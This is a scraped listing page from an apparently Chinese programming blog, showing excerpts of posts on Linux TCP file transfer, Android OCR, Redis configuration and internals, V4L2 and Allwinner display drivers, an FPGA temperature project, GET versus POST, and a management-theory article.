	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00a4164fd89c7399b7903b707e738eec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84814e5f42af721c0d7bddcd130c0e3f/" rel="bookmark">
			linux 网络传输文件,基于Linux操作系统下的TCP/IP网络通信原理实现文件传输
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、 引言
本文就是考虑到这一现状，结合基于Linux操作系统下的TCP/IP网络通信原理，给出了一种基于TCP/IP编程实现文件传输的实例，因此，TCP/IP网络通信研究具有十分重要的意义。
2、 TCP/IP协议概述
TCP/IP即传输控制协议/网络协议(Transmission Control Protocol/In
Linux支持BSD的套接字和全部的TCP/IP协议，是通过网络协议将其视为一组相连的软件层来实现的，BSD套接字(BSD Socket)由通用的套接字管理软件支持，该软件是INET套接字层，用来管理基于IP的TCP与UDP端口到端口的互联问题，从协议分层来看，IP是网络层协议，TCP是一个可靠的端口到端口的传输层协议，他是利用IP层进行传接报文的，同时也是面向连接的，通过建立一条虚拟
对于TCP传输，传输节点间先要建立连接，然后通过该连接传输已排好序的报文，以保证传输的正确性，IP层中的代码用于实现网际协议，这些代码将 IP头增加到传输数据中，同时也把收到的IP报文正确的传送到TCP层或UDP层。TCP是一个面向连接协议，而UDP则是一个非面向连接协议，当一个 UDP报文发送出去后，Linux并不知道也不去关心他是否成功地到达了目的的主机，IP层之下，是支持所有Linux网络应用的网络设备层，例如点到点协议(Point to Point Protocol，PPP)和
3、 网络通信原理
所有的网络通信就其实现技术可以分为两种，线路交换和包交换，计算机网络一般采用包交换，TCP使用了包交换通信技术，计算机网络中所传输的数据，全部都以包(Packet)这个单位来发送，包由"报头"和"报文"组成，结构如图2所示，在"报头"中记载有发送主机地址，接收主机地址及与报文内容相关的信息等，在"报文"中记载有需要发送的数据，网络中的每个主机和路由器中都有一个路由寻址表，根据这个路由表，包就可以通过网络传送到相应的目的主机。
网络通信中的一个非常重要的概念就是套接字(Socket)，简单地说，套接字就是网络进程的ID，网络通信归根到底是进程的通信，在网络中，每个节点有一个网络地址(即IP地址)，两个进程通信时，首先要确定各自所在网络节点的网络地址，但是，网络地址只能确定进程所在的计算机，而一台计算机上可能同时有多个网络进程，还不能确定到底是其中的哪个进程，由此套接字中还要有其他的信息，那就是端口号(Port)，在一台计算机中，一个端口一次只能分配给一个进程，即端口号与进程是一一对应的关系，所以，端口号和网络地址就能唯一地确定Internet中的一个网络进程。可以认为：套接字= 网络地址+端口号
系统调用一个Socket()得到一个套接字描述符，然后就可以通过他进行网络通信了。
套接字有很多种类，最常用的就有两种;流式套接字和数据报套接字。在Linux中分别称之为"SOCK_STREAM"和"SOCK_DGRAM)"他们分别使用不同的协议，流式套接字使用TCP协议，数据报套接字使用UDP协议，本文所使用的是流式套接字协议。
4、 网络通信原理在文件传输程序设计中的应用
网络上的绝大多数通信采用的都是客户机/服务器机制(Client/Server)，即服务器提供服务，客户是这些服务的使用者，服务器首先创建一个Socket，然后将该Socket与本地地址/端口号绑定(Bind())，成功之后就在相应的Socket上监听(Listen()) 。当Accept()函数捕捉到一个连接服务(Connect())请求时，接受并生成一个新的Socket,并通过这个新的Socket与客户端通信，客户端同样也要创建一个Socket，将该Socket与本地地址/端口号绑定，还需要指定服务器端的地址与端口号，随后向服务器端发出 Connect()，请求被服务器端接受后，可以通过Socket与服务器端通信。
TCP是一种面向连接的、可靠的、双向的通信数据流，说他可靠，是因为他使用3段握手协议传输数据，并且在传输时采用"重传肯定确认"机制保证数据的正确发送：接收端收到的数据后要发出一个肯定确认，而发送端必须要能接受到这个肯定信号，否则就要将数据重发。在此原理基础之上，设计了基于Linux 操作系统下TCP/IP编程实现文件传输的实例。我们采用客户机/服务器模式通信时，通信双方发送/接收数据的工作流程如图3所示。
文件传输就是基于客户机/服务器模型而设计的，客户机和服务器之间利用TCP建立连续，因文件传输是一个交互式会话系统，客户机每次执行文件传输，都需要与服务器建立控制连接和数据连接，其中控制连接负责传输控制信息、利用控制命令、客户机可以向服务器提出无限次的请求，客户机每次提出的请求，服务器与客户机建立一个数据连接，进行实际的数据传输，数据传输完毕后，对应的数据连接被清除，控制连接依然保持，等待客户机发出新的传输请求，直到客户机撤销控制连接，结束会话。
当进行文件传输时，首先向服务器发出连接请求，服务器验证身份后，与客户端建立连接，双方进入会话状态，这时只要客户端向服务器端发出数据连接请求，建立起数据连接后，双方就进入数据传输状态，数据传输完毕后，数据连接被撤销，如此循环反复，直到会话结束，从而实现将文件从服务器端传输至客户机端。
5、 文件传输程序设计流程
5.1 客户端的TCP应用程序流程
(1)先用Socket()创建本地套
(2)用Connect()函数使本地套接口向服务器端套接口发出建立连接请求，经3次握手建立TCP连接。
(3)用Read()函数读取所要接收的文件名以及存放在内存里的文件内容。
(4)用Open()函数打开客户端新建立的目标文件，如果没有建立，该函数会自动生成目标文件，等待存放文件内容。
(5)最后用Write()函数将读取的文件内容存放在新的目标文件中，以实现服务器端向客户端的文件传输。
(6)通信结束，用Close()关闭套接口，停止接收文件。
5.2 服务器端的TCP应用程序流程
(1)先用Open()函数打开等待传输的可读文件;
(2)用Socket()创建套接口，并给套接口地址结构赋值;
(3)用Bind()函数绑定套接口;
(4)用Listen()函数在该套接口上监听请求;
(5)用Accept()函数接受请求，产生新的套接口及描述字，并与客户端连接;
(6)用Lseek()函数是为了在每次接受客户机连接时，将用于读的源文件指针移到文件头;
(7)用Read()函数读取一定长度的源文件数据;
(8)最后用Write()函数将读取的源文件数据存放在内存中，以便客户端读取;
(9)传输完毕时，用Close()关闭所有进程，结束文件传输。
在文件传输过程中，很重要的一点是：当服务器端开始发送数据时，客户端要同时进行文件数据的接收。如果客户端没有运行，服务器端会一直等待客户端发送请求，当服务器源文件发送完毕，则客户端也将源文件的数据完全接收，并生成新的目标文件，从而实现文件的网络通信。
6、 结语
Linux操作系统在网络应用方面具有很强的开发潜力，同时Linux也是可靠性、安全性非常高的系统，因此在基于TCP/IP网络通信的研究与开发中，通常选用Linux操作系统作为开发平台。
本文是介绍基于Linux操作系统下TCP/IP网络通信的实际应用主要用于文件的网络传输，解决了文件传输的效率问题，作为进一步完善，可以在文件传送的过程中，加入如身份验证、权限分配、文件加密等安全机制，保证一些重要文件在传送过程中不会出现泄密的情况，该设计可广泛应用企业办公区域网中。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52928c810a5a5c5beb65403317400017/" rel="bookmark">
			Android实现选取图片进行识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、准备工作二、使用步骤1.引入库2.分析接口 三、动态选取图片1. 拍照上传图片2. 拍照上传图片 总结 前言 提示：这里可以添加本文要记录的大概内容：
例如：随着人工智能的不断发展，机器学习这门技术也越来越重要，很多人都开启了学习机器学习，本文就介绍了机器学习的基础内容。
提示：以下是本篇文章正文内容，下面案例可供参考
一、准备工作 这里采用的是阿里云的印刷文字识别，至于为什么选择因为阿里对开发者友好
首先购买识别接口地址如下： 个人开发的话买0.01元的就行了
https://market.aliyun.com/products/57124001/cmapi020020.htmlspm=5176.2020520132.101.2.7e427218XEJd5W#sku=yuncode1402000000
购买后进入管控中心得到AppCode如图：
注意：购买界面有接口文档说明，如果看不太懂那么请往下看
现在可以愉快的进行代码开发了
二、使用步骤 1.引入库 为了方便实现这里采用Retrofit进行网络编程
implementation ‘com.squareup.retrofit2:retrofit:2.7.1’
implementation ‘com.squareup.retrofit2:converter-gson:2.7.1’
implementation ‘com.squareup.okhttp3:okhttp:4.8.1’
Android所需权限声明：
&lt;uses-permission android:name="android.permission.INTERNET"/&gt; &lt;!--调用相机拍照并返回图片--&gt; &lt;uses-permission android:name="android.permission.CAMERA"/&gt; &lt;uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/&gt; &lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt; 2.分析接口 这里是阿里接口文档如图：
这里image参数需要传入图片二进制数据的base64编码/图片url
那么我们知道了地址和参数和需求，开始请求！
代码如下（示例）：
Bitmap对象压缩转码，从这个方法处理后得到了图片的转码我们就可以直接传入接口了
public static String bitmapToBase64(Bitmap bitmap) { ByteArrayOutputStream bos = new ByteArrayOutputStream(); //输出流 //参数一：压缩图片的格式 参数二：压缩量100表示不压缩 参数三： 新建的输入流对象 bitmap.compress(Bitmap.CompressFormat.JPEG, 40, bos); byte[] bytes = bos.toByteArray(); //转换来的base64码不需要加前缀，必须是NO_WRAP参数，表示没有空格。 return Base64.encodeToString(bytes, Base64.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/52928c810a5a5c5beb65403317400017/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f011065fc35fa885250ec809c563da1b/" rel="bookmark">
			用于测试ssh的免费公开服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近需要测试一下ssh服务，可惜没有服务器。于是到网上找了找免费公开的服务器。找到了这么个网站。第一行是邮箱，第二行是用户名。点击confirm注册后，会通过邮箱发送账户密码。然后ssh 用户名@tty.sdf.org。就可以开始连接了。
https://sdf.org/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae65052253e97fe7360a0ba8b20ce3ac/" rel="bookmark">
			温度检测工程——DS18B20
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 温度检测工程研究点 功能需求及选择DS18B20的理由 没有选择模拟量温度传感器是因为还需要AD转换，直接选用数字温度传感器DS18B20，淘宝资源多，网上资源多框架图，架构划分原理 划分原理： 硬件有DS18B20温度传感器、数码管、蜂鸣器、串口串口模块 + 温度传感器接口模块 + 数码管模块 + 蜂鸣器模块opcode_dect没有放到control的原因是因为凡是数据都有包文头，那么就需要先将数据解析，将游戏的命令+数据配合dout_vld传递给后面的control模块ds_intf_byte和ds_intf_bit存在的原因：后者很明显是bit模块，因为跟DS18B20是单线交互，因此需要bit模块，那么bit模块数据的发送和接收那么接着就要对应一个byte模块，control模块只是给你一个写使能和写数据，剩下的你来做这叫控制数码管显示控制模块seg_disp的输入是32位数据，32位数据的组成方式是是4bit组成一个ASCII码，比如有符号位，正整数小数点等，那么通过数码管扫描到第一个就显示32位数据最低4bit，扫到第八个就显示32位数据最高4bit各模块代码输入输出以及测试脚本的使用技巧 uart_rx: 串口协议低位在前，时钟50mhz ​​​​​​​输入：din串口输入数据，50mhz时钟和系统复位输出：dout[7:0]和dout_vld测试文件用到技巧：使用语句 $display("Err at %t ns",$time); 的方式定位错误asscii2hex ​​​​​​​ascii码一位对应8bit的二进制数，通过码表可以查询对应数值关系 ​​​​​​​输入：dint[7:0] 8bit的二进制数和din_vld输出：dout[3:0] 4bit的ascii码和dout_vld，根据输入的din_vld，下一个时钟同步输出dout和dout_vld测试文件用到技巧：din_vld只维持一个时钟周期，因此和din分开在两个initial begin end中产生opcode_dect 低位在前，收到0x55d5的帧头，那么就启动计数器，输出指令和数据 输入：din[3:0]输入ascii码数据和din_vld输出：8bit的指令和数据dout[7:0] &amp;&amp; dout_vldcontrol 最核心的模块：指令有读、写、复位，分别产生一个周期使能信号数据处理分为以下几种：①写的话要对应把写数据给过去 ②读有三种：读温度值低、高、其他分别存储到不同寄存器 ③还有打开蜂鸣器开关、开启数码管显示 ④上下限定值寄存对于温度值的读取之后要进行处理，处理方式如下：判断温度值高位寄存器最高位是否为“1”，如果为1代表负数，那么取反+1否则保持不变温度值高位和低位组帧之后的16bit数据中，[10：4]是代表温度值整数，[3：0]代表温度值小数，对于温度值进一步处理如下，因为采集到的数字量转化为温度值需要*0.0625,而整数部分右移4位就相当于*0.0625,所以不需要处理，小数部分则需要*10000*0.0625，所以就是*625，得到整数和小数部分的正整数值，需要将每一位全部求出来，通过%10的方式可以得到个位数余数将温度值的整数和小数组帧 temp_uns = {{4{temp_uns_sign}},temp_uns_int3,temp_uns_int2,temp_uns_int1,temp_uns_dot1,temp_uns_dot2,temp_uns_dot3,temp_uns_dot4};符号位+3个整数+4个小数如果指令0x0d那么就开始读取温度值指令，启动计数器，计数值7，输出数据uart_out &lt;= ds_uns_temp[(7-cnt1)*8-1 -:8]; 同步输出uart_out_vld只维持一个时钟周期，其中寄存温度值格式 ds_uns_temp = {(8'h2b+temp_uns[31]*2)，{4'b0,temp_uns[27:16]},8'h2e,temp_uns[15:0],8'h0a},其中1-4-7是传递正负号、小数点、回车的ascii码十六进制，不需要转换; 输入：uart_in[7：0]指令和数据&amp;&amp;uart_in_vld，读取数据intf_rdata[7：0]&amp;&amp;intf_rdata_vld输出：h2a_en进制转换使能、beep蜂鸣器、intf_rst_en复位使能、intf_wr_en写使能、intf_rd_en读使能、intf_wdata[7：0]写数据、temp_valid_en数码管显示使能、temp_uns[31：0]数码管显示数据、uart_out[7：0]串口上传数据&amp;&amp;uart_out_vldds_byte control和bit模块之间的桥接，完成字节到比特模块的转换 输入：读写复位使能信号，和比特模块传递过来的读传感器数据输出：读写复位使能给比特模块，同时送写数据过去ds_bit 与底层交互，完成时序协议，获取温度值数据 输入：读写复位使能输出：本模块准备好信号，读到的数据和有效指示信号seg_disp 20ms扫描每一个数码管，根据计数值得到每一个数码管，并给每个数码管一个显示值hex2asscii 用到了FIFO，将转化使能，低4位，转换时能，高四位数据写入FIFO，输出是转换使能，四位数据——先进先出需要转换,对din处理，不需要直接输出dout4bitascii码对应8bit的十六进制数，因此如果是转换，那么转换完成直接输出dout_vld,否则需要一个计数器计数两次后输出dout_vld 输入：8bit数据 ascii,转换使能输出：8bit数据Hex开发过程中遇到了哪些难题及解决办法​​​​​​​ ​​​​​​​底层时序配置读取数据，解决办法：用示波器调试control模块的温度值转换：右移4位就相当于*0.0625与上位机的交互：采用ascii因为要使用正负号显示如何下发指令：采用55d5包文头+指令+数据 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7487ed10cd08259d7409bf9403259597/" rel="bookmark">
			Redis6 系列三 配置文件介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis6 系列三 配置文件介绍 穆成祥 千缘科技
自定义目录：/myredis/redis.conf
1.1. ###Units单位###
配置大小单位,开头定义了一些基本的度量单位，只支持bytes，不支持bit
大小写不敏感
1.2. ###INCLUDES包含###
类似jsp中的include，多实例的情况可以把公用的配置文件提取出来
1.3. ###网络相关配置 ###
1.3.1. bind
默认情况bind=127.0.0.1只能接受本机的访问请求
不写的情况下，无限制接受任何ip地址的访问
生产环境肯定要写你应用服务器的地址；服务器是需要远程访问的，所以需要将其注释掉
如果开启了protected-mode，那么在没有设定bind ip且没有设密码的情况下，Redis只允许接受本机的响应
保存配置，停止服务，重启启动查看进程，不再是本机访问了。
1.3.2. protected-mode
将本机访问保护模式设置no
1.3.3. Port
端口号，默认 6379
1.3.4. tcp-backlog
设置tcp的backlog，backlog其实是一个连接队列，backlog队列总和=未完成三次握手队列 + 已经完成三次握手队列。
在高并发环境下你需要一个高backlog值来避免慢客户端连接问题。
注意Linux内核会将这个值减小到/proc/sys/net/core/somaxconn的值（128），所以需要确认增大/proc/sys/net/core/somaxconn和/proc/sys/net/ipv4/tcp_max_syn_backlog（128）两个值来达到想要的效果
1.3.5. timeout
一个空闲的客户端维持多少秒会关闭，0表示关闭该功能。即永不关闭。
1.3.6. tcp-keepalive
对访问客户端的一种心跳检测，每个n秒检测一次。
单位为秒，如果设置为0，则不会进行Keepalive检测，建议设置成60
1.4. ###GENERAL通用###
1.4.1. daemonize
是否为后台进程，设置为yes
守护进程，后台启动
1.4.2. pidfile
存放pid文件的位置，每个实例会产生一个不同的pid文件
1.4.3. loglevel
指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为notice
四个级别根据使用阶段来选择，生产环境选择notice 或者warning
1.4.4. logfile
日志文件名称
1.4.5. databases 16
设定库的数量默认16，默认数据库为0，可以使用SELECT&lt;dbid&gt;命令在连接上指定数据库id
1.5. ###SECURITY安全###
1.5.1. 设置密码
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7487ed10cd08259d7409bf9403259597/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bae02b169309c9a0eb92af1ae4fddbc9/" rel="bookmark">
			V4L2驱动框架简单分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自：https://www.cnblogs.com/huty/p/8518234.html
概述 Video4Linux2是Linux内核中关于视频设备的内核驱动框架，为上层的访问底层的视频设备提供了统一的接口。凡是内核中的子系统都有抽象底层硬件的差异，为上层提供统一的接口和提取出公共代码避免代码冗余等好处。就像公司的老板一般都不会直接找底层的员工谈话，而是找部门经理了解情况，一个是因为底层屌丝人数多，意见各有不同，措辞也不准，部门经理会把情况汇总后再向上汇报；二个是老板时间宝贵。
V4L2支持三类设备：视频输入输出设备、VBI设备和radio设备(其实还支持更多类型的设备，暂不讨论)，分别会在/dev目录下产生videoX、radioX和vbiX设备节点。我们常见的视频输入设备主要是摄像头，也是本文主要分析对象。下图V4L2在Linux系统中的结构图：
Linux系统中视频输入设备主要包括以下四个部分：
字符设备驱动程序核心：V4L2本身就是一个字符设备，具有字符设备所有的特性，暴露接口给用户空间；V4L2驱动核心：主要是构建一个内核中标准视频设备驱动的框架，为视频操作提供统一的接口函数；平台V4L2设备驱动：在V4L2框架下，根据平台自身的特性实现与平台相关的V4L2驱动部分，包括注册video_device和v4l2_dev。具体的sensor驱动：主要上电、提供工作时钟、视频图像裁剪、流IO开启等，实现各种设备控制方法供上层调用并注册v4l2_subdev。
V4L2的核心源码位于drivers/media/v4l2-core，源码以实现的功能可以划分为四类：核心模块实现：由v4l2-dev.c实现，主要作用申请字符主设备号、注册class和提供video device注册注销等相关函数；V4L2框架：由v4l2-device.c、v4l2-subdev.c、v4l2-fh.c、v4l2-ctrls.c等文件实现，构建V4L2框架；Videobuf管理：由videobuf2-core.c、videobuf2-dma-contig.c、videobuf2-dma-sg.c、videobuf2-memops.c、videobuf2-vmalloc.c、v4l2-mem2mem.c等文件实现，完成videobuffer的分配、管理和注销。Ioctl框架：由v4l2-ioctl.c文件实现，构建V4L2ioctl的框架。 V4L2框架 结构体v4l2_device、video_device、v4l2_subdev和v4l2_fh是搭建框架的主要元素。下图是V4L2框架的结构图：
从上图V4L2框架是一个标准的树形结构，v4l2_device充当了父设备，通过链表把所有注册到其下的子设备管理起来，这些设备可以是GRABBER、VBI或RADIO。V4l2_subdev是子设备，v4l2_subdev结构体包含了对设备操作的ops和ctrls，这部分代码和硬件相关，需要驱动工程师根据硬件实现，像摄像头设备需要实现控制上下电、读取ID、饱和度、对比度和视频数据流打开关闭的接口函数。Video_device用于创建子设备节点，把操作设备的接口暴露给用户空间。V4l2_fh是每个子设备的文件句柄，在打开设备节点文件时设置，方便上层索引到v4l2_ctrl_handler，v4l2_ctrl_handler管理设备的ctrls，这些ctrls(摄像头设备)包括调节饱和度、对比度和白平衡等。
下面介绍上图提到的几个结构体：
v4l2_device
v4l2_device在v4l2框架中充当所有v4l2_subdev的父设备，管理着注册在其下的子设备。以下是v4l2_device结构体原型(去掉了无关的成员)：
struct v4l2_device { charname[V4L2_DEVICE_NAME_SIZE]; //device 名字 structkref ref; //引用计数 structlist_head subdevs; //用链表管理注册的subdev struct media_device *mdev;	//管理组成media link的媒体设备 struct v4l2_ctrl_handler *ctrl_handler;	//该v4l2设备的控制接口 …… }; 可以看出v4l2_device的主要作用是管理注册在其下的子设备，方便系统查找引用到。
V4l2_device的注册和注销：
int v4l2_device_register(struct device*dev, struct v4l2_device *v4l2_dev) static void v4l2_device_release(struct kref *ref) V4l2_subdev
V4l2_subdev代表子设备，包含了子设备的相关属性和操作。先来看下结构体原型：
struct v4l2_subdev { structv4l2_device *v4l2_dev; //指向父设备 //提供一些控制v4l2设备的接口 conststruct v4l2_subdev_ops *ops; //向V4L2框架提供的接口函数 conststruct v4l2_subdev_internal_ops *internal_ops; //subdev控制接口 structv4l2_ctrl_handler *ctrl_handler; /* namemust be unique */ charname[V4L2_SUBDEV_NAME_SIZE]; /*subdev device node */ structvideo_device *devnode; }; 每个子设备驱动都需要实现一个v4l2_subdev结构体，v4l2_subdev可以内嵌到其它结构体中，也可以独立使用。结构体中包含了对子设备操作的成员v4l2_subdev_ops和v4l2_subdev_internal_ops，对/dev/videoXX节点进行open/ioctl/close最终会调用到所有子设备中这两个ops的函数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bae02b169309c9a0eb92af1ae4fddbc9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/852bd9e266c8f212ffc9969a53db3ef8/" rel="bookmark">
			管理学之父彼得·德鲁克：目标管理的基本思路、原则及分解方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1954年，德鲁克提出了一个具有划时代意义的概念——目标管理（Management By Objectives，简称为MBO)，它是德鲁克所发明的最重要、最有影响的概念，并已成为当代管理学的重要组成部分。
目标管理的主要贡献之一就是它使得我们能用自我控制的管理来代替由别人统治的管理。
德鲁克目标管理基本思想： 1）企业的任务必须转化为目标，企业管理人员必须通过这些目标对下级进行领导并以此来保证企业总目标的实现；
2）目标管理是一种程序，使一个组织中的上下各级管理人员会同起来制定共同的目标，确定彼此的成果责任，并以此项责任来作为指导业务和衡量各自贡献的准则；
3）每个企业管理人员或工人的分目标就是企业总目标对他的要求，同时也是这个企业管理人员或工人对企业总目标的贡献；
4）管理人员和工人靠目标来管理，以所要达到的目标为依据，进行自我管理、自我控制，而不是由他的上级来指挥和控制；
5）企业管理人员对下级进行考核和奖惩也是依据这些分目标。
目标管理三个基本原则： 1）SMART原则
2）方向统一原则：由总目标分解成各子目标过程中， 必须确保各目标的一致性。
3）进度统一：各分解目标是紧密相关的，必须过程同步，一步步靠近总目标。
目标管理要点：总体目标要层层分解最终到达个人 个人分目标就是企业总目标对他的要求，同时也是这个企业管理人员或工人对企业总目标的贡献；只有分解到个人，才能高效的完成总体目标。
目标分解方法：逐级承接分解法（DOAM法) 1）行动方向（D）：
清晰刻画战略意图或战略任务；下一级的行动方向（D）是上一级的行动计划（A）
2）目标（O）：是行动方向在2019年期望成功状态的表述，下一级目标（O）是上一级对应行动计划（A）的衡量标准（M）。
3）行动计划（A）：实现目标（O）的行动分解，要具体；各行动计划之间不重叠、不交叉；
行动计划要有所侧重，有所忽略；明确责任部门与负责人员。
4）衡量标准（M）：针对每项行动的具体衡量标准；必须可量化，可考核；包括量化的绩效指标KPI以及细化的管理指标KMI。
集团公司部门年度重点工作DOAM格式示例：
何老师推荐： 花上万甚至几十万学习EMBA课不如报名我们的高管成长课，我们已经为您准备了CEO百元成长课程，将各商学院EMBA课程内容进行了提炼，整理成100节精品音频课，课程包含企业管理、资本运营、战略及运营管理、人才管理、财务管理、项目投融资、企业并购重组、上市指导、互联网运营创新等丰富内容。
您只需要每天花很短的时间来收听既可以搞定了。如果您感兴趣，请点击下面的蓝色字体'了解更多'链接即可，开启您企业发展进阶之旅。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ccbc385f55e359c04cdd782fbacf6f93/" rel="bookmark">
			2021-4-26
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring 循环依赖
Spring用@Autowire向一个类注入一个接口的两个实现类
Reids 中 Stinrg 的底层数据结构
10种常用设计模式
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0017a5e1c465db125c2a19460b806d0/" rel="bookmark">
			get和post用法和区别总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.get是从服务器上获取数据，post是向服务器传送数据。
2.get传送的数据量较小，不能大于2KB。post传送的数据量较大，一般被默认为不受限制。
3.get安全性非常低，post安全性较高。但是执行效率却比Post方法好。
4.在进行文件上传时只能使用post而不能是get。
5.对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。
6.get方式的安全性较Post方式要差些，包含机密信息的话，建议用Post数据提交方式。在做数据查询时，建议用Get方式；而在做数据添加、修改或删除时，建议用Post方式；
7.Get产生一个TCP数据包；Post产生两个TCP数据包。
对于Get方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据），而对于Post，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok。
总结：GET把参数包含在URL中，POST通过request body传递参数，所以Post更加安全一些；Get的效率比Post高一些，但是Get请求发送的参数是有限的，而Post请求是没有限制的(理论上来讲)。
详细参考链接：(7条消息) http GET 和 POST 请求的优缺点和误区 --前端优化_会飞的程序猿-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f1801493327ec8a32e46c6cfe89d6f8/" rel="bookmark">
			pytorch同时让两个dataloader打乱的顺序是相同
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		class MyDataset(Dataset): def __init__(self, datasetA, datasetB): self.datasetA = datasetA self.datasetB = datasetB def __getitem__(self, index): xA = self.datasetA[index] xB = self.datasetB[index] return xA, xB def __len__(self): return len(self.datasetA) datasetA = ... datasetB = ... dataset = MyDataset(datasetA, datasetB) loader = DataLoader(dataset, batch_size=10, shuffle=True) https://discuss.pytorch.org/t/dataloader-shuffle-same-order-with-multiple-dataset/94800/2
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c01fa5eef9a52bc7ae8ae86e8104c29a/" rel="bookmark">
			Redis底层的数据结构学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘抄自：https://www.cnblogs.com/ysocean/p/9102811.html
Redis的底层数据结构
1、每个值都是一个RedisObject对象
属性主要有以下：
type：指的是对象的类型，比如有string list hash set zset;
encoding：采用命令OBJECT ENCODING key,可以查看每个类型的底层的数据结构
*ptr：指针，指向底层的数据结构
refcount：引用计数
lru：最后一次访问时间
2、String
数据类型的底层数据结构，SDS simple dynamic string，简单动态字符串
SDS定义，主要属性有len 记录字符串的长度，free记录字符串数据的剩余长度，buf[]数据存储时间的字符串
相比c语言原生的字符串，SDS做了些优化
特点：
1)、由于len记录了字符串长度，获取长度的时间复杂度为O1,C原生的字符串需要遍历计数，时间复杂的为O(n)
2)、防止缓冲区溢出。当发生字符串修改时，通过len预估占用的内存大小，如果不够，先扩容
3)、减少修改字符串的内存分配次数，当字符串长度增加或减少时，都需要调整内存空间，可以减少释放再分配的次数
编码： int embstr raw
int：存储long类型的数值
embstr：存储长度小于44的字符串
raw：存储长度大于44的字符串
embstr和raw都是使用redisObject和sds保存数据，
embstr使用只分配一次内存空间，存储的数据都是连续的，但是当数据长度发生变化时，需要全部重新分配内存。一般只用来只读的数据
raw要分配两次空间
3、list
就是简单的字符串列表，按照插入顺序排序，底层就是一个链表结构
特点：
1）、双端，有前置节点和后置节点
2）、无环，第一个节点的pre是null，最后一个节点的next是null
3）、带有长度计数器，通过len可以获取链表的长度
编码：ziplist：压缩列表，即按顺序一个个的存
linkedlist：链表，双端列表
转换：1、列表保存元素个数小于512个
2、每个元素长度小于64字节
不满足这两个条件，将采用linkedlist
4、hash
编码：ziplist 压缩列表
hashtable 字典，hash的键值对每个都对应字典中的键值对
转换：
1、列表保存元素个数小于512个
2、每个元素长度小于64字节
不满足这两个条件，将采用hashtable
5、set
set中是存储的string的集合，相对于list，set中的数据是无序的，不重复的。list是有序的，可重复的
编码：intset 所有存储的元素都是整型的数字
hashtable 每个键都是字符串，每个值都是null,类比java中，hashset是基于hashmap实现的
转换：当集合同时满足以下两个条件，使用intset编码：
当集合中的元素都是整型时
集合对象所有元素不超过512
不能满足这两个条件，就是用hashtable
6 zset
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c01fa5eef9a52bc7ae8ae86e8104c29a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b03abfa9364e9cd88de9fe5c137b04ed/" rel="bookmark">
			全志T7 Display驱动分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文档在《全志T7 Display驱动简介.docx》基础上进行补充说明，主要的目的是想了解系统总共有多少个图像层可以给应用程序使用，好让以后应用程序如何同叠加图像层来高效显示画面。
DST配置 下面说明比较旧，仅供参考：
Display驱动入口 驱动的入口文件是dev_disp.c，入口函数disp_module_init()：
static int __init disp_module_init(void) { int ret = 0, err; //1、注册一个/dev/disp的字符设备 alloc_chrdev_region(&amp;devid, 0, 1, "disp");//动态分配设备编号 my_cdev = cdev_alloc();//分配字符设备 cdev_init(my_cdev, &amp;disp_fops);//字符设备的初始化 my_cdev-&gt;owner = THIS_MODULE; err = cdev_add(my_cdev, devid, 1); //2、注册一个/sys/disp的类 disp_class = class_create(THIS_MODULE, "disp");//将在sys目录下创建disp目录 display_dev = device_create(disp_class, NULL, devid, NULL, "disp"); //3、注册Disp驱动 ret = platform_driver_register(&amp;disp_driver);//注册Display驱动 dispdbg_init();//创建一些用于调试的目录文件 return ret; } 这里我们截取一些重要的信息：
DISP_DEVICE_NUM等于3，说明系统有3个LCD控制器。在disp2\disp\de\lowlevel_v2x\de_feat.h中可以修改一些宏进行配置：
